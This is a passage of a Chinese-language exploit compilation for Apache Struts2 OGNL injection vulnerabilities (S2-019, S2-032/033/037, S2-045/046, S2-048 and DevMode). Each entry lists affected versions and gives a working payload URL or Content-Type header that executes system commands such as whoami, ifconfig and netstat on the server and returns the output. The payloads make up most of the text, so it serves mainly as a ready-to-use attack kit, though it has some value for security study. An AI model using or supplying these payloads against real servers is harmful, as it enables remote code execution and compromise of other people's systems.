    http://127.0.0.1:8080/struts2-showcase-2.1.6/showcase.action?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]%20{%27netstat%27,%27-an%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%20%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%20%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%20%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}
[](http://127.0.0.1:8080/struts2-showcase-2.1.6/showcase.action?redirect:%24%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%20%7B%27netstat%27,%27-an%27%7D%29%29.start%28%29,%23b%3D%23a.getInputStream%28%29,%23c%3Dnew%20java.io.InputStreamReader%20%28%23b%29,%23d%3Dnew%20java.io.BufferedReader%28%23c%29,%23e%3Dnew%20char%5B50000%5D,%23d.read%28%23e%29,%23matt%3D%20%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%20%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29%7D)
**五 S2-019**
Struts 2.0.0 – Struts 2.3.15.1
Struts 2.3.15.2以后的版本默认关闭开发模式, 比较鸡肋。
EXP:
    http://x.x.x.x/x.action?debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()
**六 S2-032 S2-033 S2-037**
受影响版本：2.3.18-2.3.28(except 2.3.20.2 and 2.3.24.2)。
**S2-032**
假如动态方法调用已经开启,然后我们要调用对应的login方法的话
我们可以通过[http://localhost:8080/struts241/index!login.action](http://localhost:8080/struts241/index!login.action)来执行动态的方法调用。这种动态方法调用的时候method中的特殊字符都会被替换成空，但是可以通过[http://localhost:8080/struts241/index.action?method:login](http://localhost:8080/struts241/index.action?method:login%C0%B4%C8%C6%B9%FD%CE%DE%B7%A8%B4%AB%C8%EB%CC%D8%CA%E2%D7%D6%B7%FB%B5%C4%CF%DE%D6%C6)[来绕过无法传入特殊字符的限制](http://localhost:8080/struts241/index.action?method:login%C0%B4%C8%C6%B9%FD%CE%DE%B7%A8%B4%AB%C8%EB%CC%D8%CA%E2%D7%D6%B7%FB%B5%C4%CF%DE%D6%C6)。
EXP:
    http://x.x.x.x/x.action?method:%23_memberAccess[%23parameters.name1[0]]%3dtrue,%23_memberAccess[%23parameters.name[0]]%3dtrue,%23_memberAccess[%23parameters.name2[0]]%3d{},%23_memberAccess[%23parameters.name3[0]]%3d{},%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew%20java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&name=allowStaticMethodAccess&name1=allowPrivateAccess&name2=excludedPackageNamePatterns&name3=excludedClasses&cmd=whoami&pp=\\A&ppp=%20&encoding=UTF-8
**S2-033**
该漏洞依附于S2-032漏洞，当开启动态方法调用，并且同时使用了Strut2 REST
Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行。
EXP:[](http://localhost:8080/struts2-rest-showcase-280/orders/3!%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command%5B0%5D\),%23xx%3D123,%23xx.toString.json?&command=calc.exe)
    http://localhost:8080/struts2-rest-showcase-280/orders/3!%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23xx%3d123,%23xx.toString.json?&command=calc.exe
**S2-037**
该漏洞受影响版本等同于S2-032、S2-003，尽管不需要配置struts.enable.DynamicMethodInvocation为true，但是需要调用Strut2
REST 插件才能触发。Strut2
REST还支持actionName/id/methodName这种方式处理解析uri，直接将id后面的内容作为method属性设置到mapping中。
EXP:[](http://localhost:8080/struts2-rest-showcase-280/orders/3/%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command%5B0%5D\),%23xx%3D123,%23xx.toString.json?&command=calc.exe)
    http://localhost:8080/struts2-rest-showcase-280/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23xx%3d123,%23xx.toString.json?&command=calc.exe
**七 S2-045 、S2-046**
受影响的版本：
Struts 2.3.5 – Struts 2.3.31
Struts 2.5 – Struts 2.5.10
**S2-045:**
这个漏洞是由于Strus2对错误消息处理出现了问题，通过Content-Type这个header头，注入OGNL语言，进而执行命令。攻击者可以将恶意代码通过http报文头部的Content-Type字段传递给存在漏洞的服务器，导致任意代码执行漏洞，要想顺利触发德华，lib中一定要有commons-fileupload-x.x.x.jar包
    Content-Type：%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
**S2-046:**
该漏洞与S2-045触发点一样，但利用方式不同，使用恶意的Content-Disposition值或者使用不合适的Content-Length头就可能导致远程命令执行。
**八 S2-048**
受影响的Struts版本：Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本
这个漏洞主要问题出在struts2-struts1-plugin这个非默认的插件包上，由于struts2-struts1-plugin 包中的
“Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个
getText() 的
参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击。该漏洞利用的payload
与s2-045其实都是一样的，只是触发点不同和影响范围不同而已。
    Content-Type:%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
**九 DevMode**
影响版本：Struts 2.1.0–2.5.1
S2-008漏洞也是一个devMode下的远程执行漏洞，由于当时Apache还没有专门的声明，要求开发者在发布系统的时候必须关闭devMode，因此这个漏洞当时还是被他们给予了CVE编号，并在后续比较迟的时候增加了对其利用方式的过滤处理。CVE编号授予的时候，Struts2的最新版本为2.3.1，但在其后直至2.3.28之前的版本都能够触发这个漏洞，从2.3.29开始，官方增加了一个检查项——禁止链式表达式，这才阻止了特定ognl表达式的执行。但是不得不说该漏洞一直存在，只是利用条件变得越来越苛刻。
当struts.xml或struts.properties配置文件中
便会触发相应漏洞。
EXP1:
    http://localhost:8080/test02/Login.action?debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnew java.io.InputStreamReader%28%23a%29%2c%23c%3dnew java.io.BufferedReader%28%23b%29%2c%23d%3dnew char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29
EXP2:[](http://localhost:8080/test02/Login.action?debug=command&expression=%23application)
    http://localhost:8080/test02/Login.action?debug=command&expression=%23application
[](http://localhost:8080/test02/Login.action?debug=command&expression=%23application)
**参考文章**
1.
2.[http://netsecurity.51cto.com/art/201707/544837.htm](http://netsecurity.51cto.com/art/201707/544837.htm)
3.[https://www.seebug.org/vuldb/ssvid-92088](https://www.seebug.org/vuldb/ssvid-92088)
4.[https://www.waitalone.cn/struts2-command-exp.html](https://www.waitalone.cn/struts2-command-exp.html)
5.[https://cwiki.apache.org/confluence/display/WW/S2-009](https://cwiki.apache.org/confluence/display/WW/S2-009)
6.[http://www.cnblogs.com/shellr00t/p/5721558.html](http://www.cnblogs.com/shellr00t/p/5721558.html)